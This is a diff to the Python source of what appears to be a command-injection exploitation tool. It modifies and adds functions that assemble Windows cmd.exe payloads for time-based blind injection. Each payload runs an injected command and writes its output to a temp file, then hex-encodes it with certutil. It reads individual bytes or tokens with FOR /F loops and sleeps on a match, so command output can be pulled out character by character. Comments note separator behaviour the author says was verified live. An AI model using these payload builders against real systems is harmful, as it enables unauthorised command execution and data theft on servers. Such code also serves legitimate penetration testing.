@@ -8418,12 +8418,36 @@ def windows_hex_byte_probe(chain, cmd, num_of_chars, operator, expected_hex, tim
   hex_file = "%temp%\\" + var + ".hex"
   line, column = divmod(num_of_chars - 1, 16)
   offset = column * 3 + (1 if column >= 8 else 0)
+  # 'skip=0' is not the no-op its name suggests - cmd.exe's FOR /F silently refuses the whole
+  # clause (confirmed live: the loop's own 'do' never runs, not even once, and nothing after it
+  # in the same statement runs either), where leaving 'skip=' out entirely starts at line one as
+  # the default already does. Only emitted at all once there is a real line to skip to.
+  read_options = "tokens=* eol=" + (" skip=" + str(line) if line else "")
+  # Only the first link is the separator under test - a pipe's right-hand side is one command,
+  # and '&&'/'||' only gate whether that first one runs at all; everything from the first bare
+  # '&' on is unconditional, same as every other multi-stage Windows payload in this tree.
   return (chain +
-          "(cmd /c " + cmd + ")>" + tmp_file + chain +
-          "certutil -encodehex -f " + tmp_file + settings.SINGLE_WHITESPACE + hex_file + " 4" + chain +
-          "for /f \"tokens=* eol= skip=" + str(line) + "\" %a in (" + hex_file + ") do set " + var + "=%a" + chain +
+          "(cmd /c " + cmd + ")>" + tmp_file + WINDOWS_CHAIN +
+          "certutil -encodehex -f " + tmp_file + settings.SINGLE_WHITESPACE + hex_file + " 4" + WINDOWS_CHAIN +
+          "for /f \"" + read_options + "\" %a in (" + hex_file + ") do set " + var + "=%a" + WINDOWS_CHAIN +
           "for /f \"tokens=* eol=\" %b in ('cmd /c \"echo %" + var + ":~" + str(offset) + ",2%\"') do cmd /c if %b " +
           operator + settings.SINGLE_WHITESPACE + expected_hex + settings.SINGLE_WHITESPACE +
+          windows_sleep(timesec) + windows_tail(chain))
+
+"""
+The Nth space-separated token of a file, held back when it stands in the given relation to the
+expected one - for a file already written as one decimal number per character (what the
+tempfile-based technique's own Windows 'cmd_execution()' writes there). No caret-through-'set'
+hazard here to read around with 'certutil': a decimal digit carries no meaning to cmd.exe, so the
+FOR variable is compared directly, in its own loop body, with no second 'for /f' or file of its
+own needed - verified live under all four chaining separators ('|' and '||' bind only their own
+immediate right-hand command, same as windows_hex_byte_probe(), so the wrapping comparison runs
+through 'cmd /c' exactly as that one's does).
+"""
+def windows_token_probe(chain, file, token, operator, expected, timesec):
+  return (chain +
+          "for /f \"tokens=" + str(token) + "\" %a in (" + file + ") do cmd /c if %a " +
+          operator + settings.SINGLE_WHITESPACE + str(expected) + settings.SINGLE_WHITESPACE +
           windows_sleep(timesec) + windows_tail(chain))
 
 """
